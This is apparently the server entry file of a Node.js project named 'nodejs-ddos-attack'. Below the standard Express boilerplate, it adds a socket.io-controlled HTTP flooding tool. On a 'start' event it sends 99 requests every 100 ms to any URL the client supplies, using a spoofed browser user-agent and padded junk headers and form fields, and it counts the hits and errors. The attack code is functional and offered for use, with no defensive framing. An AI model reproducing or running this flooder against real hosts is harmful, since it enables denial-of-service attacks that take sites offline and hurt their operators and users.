#!/usr/bin/env node

/**
 * Module dependencies.
 */

var app = require('../app');
var debug = require('debug')('nodejs-ddos-attack:server');
var http = require('http');

/**
 * Get port from environment and store in Express.
 */

var port = normalizePort(process.env.PORT || '3000');
app.set('port', port);

/**
 * Create HTTP server.
 */

var server = http.createServer(app);

/**
 * Listen on provided port, on all network interfaces.
 */

server.listen(port);
server.on('error', onError);
server.on('listening', onListening);

/**
 * Normalize a port into a number, string, or false.
 */

function normalizePort(val) {
  var port = parseInt(val, 10);

  if (isNaN(port)) {
    // named pipe
    return val;
  }

  if (port >= 0) {
    // port number
    return port;
  }

  return false;
}

/**
 * Event listener for HTTP server "error" event.
 */

function onError(error) {
  if (error.syscall !== 'listen') {
    throw error;
  }

  var bind = typeof port === 'string'
    ? 'Pipe ' + port
    : 'Port ' + port;

  // handle specific listen errors with friendly messages
  switch (error.code) {
    case 'EACCES':
      console.error(bind + ' requires elevated privileges');
      process.exit(1);
      break;
    case 'EADDRINUSE':
      console.error(bind + ' is already in use');
      process.exit(1);
      break;
    default:
      throw error;
  }
}

/**
 * Event listener for HTTP server "listening" event.
 */

function onListening() {
  var addr = server.address();
  var bind = typeof addr === 'string'
    ? 'pipe ' + addr
    : 'port ' + addr.port;
  debug('Listening on ' + bind);
}

var io = require("socket.io")(server);
io.on('connection',function (socket) {

  console.log("user is connected");



  socket.on('start',function (u) {

   interval = setInterval(function () {
      for (var i = 1; i<100; i++)
        attack(u);
    },100);

  });

    socket.on('stop',function (u) {

        if (interval) clearInterval(interval);

    });


});

var n = 0;
var er = 0;

var interval;



function attack(host) {
    var request = require('request');

    var headers = {'content-type' : 'application/x-www-form-urlencoded',
    'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
      'x-cros-1':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-2':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-3':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-4':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-5':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-6':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-7':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-8':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-9':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-10':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
        'x-cros-11':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr'
    };

    var form = {
          'id':'hkgkhkkgkhkglfkhkhkg',
          'id2':'hjgkflkgkhkgkhg',
        'id22':'hkgkhkkgkhkglfkhkhkg',
        'id54':'hjgkflkgkhkgkhg',
        'id5':'hkgkhkkgkhkglfkhkhkg',
        'id232':'hjgkflkgkhkgkhg',
        'id43':'hkgkhkkgkhkglfkhkhkg',
        'id32':'hjgkflkgkhkgkhg',
        'id21':'hkgkhkkgkhkglfkhkhkg',
        'id22':'hjgkflkgkhkgkhg',
        'id43':'hkgkhkkgkhkglfkhkhkg',
        'id22':'hjgkflkgkhkgkhg',
        'id4':'hkgkhkkgkhkglfkhkhkg',
        'id23':'hjgkflkgkhkgkhg',
    }

    form['x-cros'] = form['id23'].repeat(2);

    var option = {
        url:host,
        headers: headers,
        method: "GET",
        form:form
    }

    request(option,function (error, response, body) {

      if (error)
      {
        console.log(error);
        er++;
        io.sockets.emit('err', er);

        return;
      }


        console.log(response.statusCode);
        n++;

        io.sockets.emit('status',n);
    });
}